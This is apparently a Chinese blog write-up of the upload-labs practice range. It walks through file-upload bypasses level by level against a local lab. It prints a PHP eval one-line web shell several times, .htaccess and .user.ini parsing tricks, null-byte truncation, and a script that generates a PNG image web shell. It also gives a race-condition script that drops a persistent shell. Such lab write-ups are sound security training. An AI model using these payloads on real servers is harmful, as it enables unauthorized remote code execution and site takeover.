---
title: upload-labs
date: 2020-04-16 23:29:45
updated: 2020-04-16 23:29:45
categories: Write up
---

文件上传漏洞<!--more-->

# Pass-01

## 考察点：前端绕过



发现上传.php文件时，alert:`该文件不允许上传，请上传.jpg|.png|.gif,当前文件类型为:php`,这表明验证点在前端(js)，而不在服务端.

F12找找js源码，整理如下：

```

function checkFile() {
var file = document.getElementsByName('upload_file')[0].value;
if (file == null || file == "") {
	alert("请选择要上传的文件!");
	return false;
}
//定义允许上传的文件类型
var allow_ext = ".jpg|.png|.gif";
//提取上传文件的类型
var ext_name = file.substring(file.lastIndexOf("."));
//判断上传文件类型是否允许上传
if (allow_ext.indexOf(ext_name) == -1) {
	var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
	alert(errMsg);
	return false;
}
}

```

直接修改js代码或者上传一个有一句话木马`<?php @eval($_POST[value]);?>`的符合题目后缀要求的文件，抓包修改请求内容绕过，蚁剑链接



# Pass-02

## 考察点：服务器端MIME绕过

```
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') 
          || ($_FILES['upload_file']['type'] == 'image/gif')) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '文件类型不正确，请重新上传！';
        }
    } else {
        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
    }
}

```

很明显对Content-Type进行了检查，抓包更改Content-Type进行绕过即可，上传成功，蚁剑连接



# Pass-03

## 考察点 黑名单过滤

上传一个写有`AddType application/x-httpd-php .jpg`的.htaccess文件，然后再上传一个写有一句话木马的.jpg文件,蚁剑连接。

.htaccess作用：可以把 .jpg后缀格式的文件名以php格式解析，因此达到了可执行的效果



# Pass-04

## 考察点   .htaccess绕过

 同上



# Pass-05

## 考察点  .user.ini

做法类似.htaccess,上传一个写有`auto_prepend_file=1.jpg`为后缀的.user.ini文件，然后在上传一个写有一句话木马的jpg文件，上传成功后，蚁剑连接，但是要注意，题目提示`上传目录存在php文件（readme.php)`所以蚁剑连接的时候要把文件名改成readme.php

### .user.ini作用  所有的php文件都自动包含jpg文件



# Pass-06

## 考察点 大小写绕过

看源码，黑名单几乎过滤了所有后缀包括.htaccess，但是发现没有对大小写设置，抓包改下大小写绕过



# Pass-07

## 考察点 空格绕过



空格过滤，直接抓包加空格就好了





# Pass-08

## 考察点  点号绕过



抓包加点



# Pass-09

## 考察点   ::$DATA绕过

 ::$DATA作用：php在windows中如果文件名+"::$DATA"会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持"::$DATA"之前的文件名(Windows文件流特性)



上传一句话木马的.php后缀文件，抓包加::$DATA，上传成功，蚁剑连接（连接的时候要把文件名的::$DATA去掉）



# Pass-10

## 考察点  .[空格].绕过



注意拼接部分`$img_path = UPLOAD_PATH.'/'.$file_name;`最后保存的是原始文件，而不是经过检测的文件



# Pass-11

## 考察点 双写绕过

`$file_name = str_ireplace($deny_ext,"", $file_name);`很明显是双写绕过，str_ireplace（）函数的作用如下：

```
把字符串 "Hello world!" 中的字符 "WORLD"（不区分大小写）替换成 "Shanghai"：
<?php
echo str_ireplace("WORLD","Shanghai","Hello world!");
?>
```

抓包，把.php后缀改为.pphphp,成功绕过



# Pass-12

## 考察点  00截断（GET）

> 截断条件：
> 1、php版本小于5.3.4
> 2、php.ini的magic_quotes_gpc为OFF状态

原理：

```
url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束
```

使用情况：
```
上传时路径可控，使用00截断
文件下载时，00截断绕过白名单检查
文件包含时，00截断后面限制(主要是本地包含时)
其它与文件操作有关的地方都可能使用00截断。
```

```php
$img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
```

构造`sava_path=/upload/1.php%00`绕过



# Pass-13

## 考察点  00截断（POST)

```php
 $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
```

原理同上，但由于save_path参数通过POST方式传递，而POST不会像GET那样对%00进行自动解码，所以需要在二进制中进行修改  ，将hex改为00



# Pass-14

## 考察点  图片马上传

可以将图片带入到PHP代码里，从而导致PHP代码执行

### 图片马制作

GIF的文件头GIF89a ,ZIP压缩文件文件头PK   ,7z压缩文件文件头7z

```
法1.创建一个空的.php文件，用notepad++写入GIF89a  <?php @eval($_POST[value]);?>
法2.gif后缀文件,用notepad++写入一句话木马
```

把制作好的图片马上传，打开`文件包含漏洞`发送GET请求`？file=upload/图片文件名`，蚁剑连接即可


# Pass-15

## 考察点 getimagesize

getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息.本关匹配Content-type

```
索引 [2] 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM
```

做法同Pass-14



# Pass-16

## 考察点 exif_imagetype()

 exif_imagetype() 读取一个图像的第一个字节并检查其签名。如果发现了恰当的签名则返回一个对应的常量，否则返回 FALSE。返回值跟getimagesize() 返回的数组中的索引 [2] 的值是一样的



要做这个题首先要把Php扩展php_exif开启

做法同上



# Pass-17

## 考察点 二次渲染  /  imagecreatefromjpeg（）

```php
imagecreatefromjpeg()会把文件尾部的PHP代码去除，所以本题只需找到渲染前后没有变化的位置(可以用beyond compare进行比较）,然后将一句话php代码写进去，即可上传成功
```

做法同上

```
下列代码，可以制作一张二次渲染过后，恶意代码依旧存在的png图片马
<?php
//png.php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0xe, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x1, 0xdc, 0x5a, 0x1, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);
$img = imagecreatetruecolor(32, 32);
for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}
imagepng($img,'./pass17.png');
?>


cmd执行php payload.php  file.png
paylod.php是写有以上代码的文件
file.png是随意一张png图片
pass17.png是生成的图片
```

png图片上传后利用文件包含漏洞传 post 参数，同时GET：&0=phpinfo



# Pass-18

## 考察点 条件竟争绕过


```
条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同的请求时是并发进行的，因此如果并发处理不当或相关操作顺序设计的不合理时，将会导致此类问题的发生。

上传文件源代码里没有校验上传的文件，文件直接上传，上传成功后才进行判断：如果文件格式符合要求，则重命名，如果文件格式不符合要求，将文件删除

由于服务器并发处理(同时)多个请求，假如a用户上传了木马文件，由于代码执行需要时间，在此过程中b用户访问了a用户上传的文件，会有以下三种情况：
1.访问时间点在上传成功之前，没有此文件
2.访问时间点在刚上传成功但还没有进行判断，该文件存在
3.访问时间点在判断之后，文件被删除，没有此文件

可通过bp的intruder模块大量发送上传文件数据包，再新开一个intruder模块大量接受访问此文件的数据包，会出现一些执行成功的结果
永久：
执行成功时，通过代码写入一个文件，文件里写入木马， 之后重复临时的步骤，执行成功时就会将带有木马的文件写入

原文链接：https://blog.csdn.net/wsnbbz/article/details/104651408/
```

创建一个shell.php文件，里边内容

```
<?php
$myfile = fopen("shell_pass18.php","w") or die("Unable to open file!");
$txt = '<?php @eval($_POST[value]); echo "i am";?>';
fwrite($myfile, $txt);
fclose($myfile);
?>
```

上传抓包，发包到intruder, Clear,Add变量a(自己加的）,

Playload type:Numbers

From:1 ,To:11111

打开浏览器页面http://127.0.0.1/upload-labs/upload/shell.php

start attack

疯狂刷新，看到有页面一闪而过就可以了

然后访问http://127.0.0.1/upload-labs/upload/shell_pass18.php

成功，蚁剑连接



# Pass-19

同上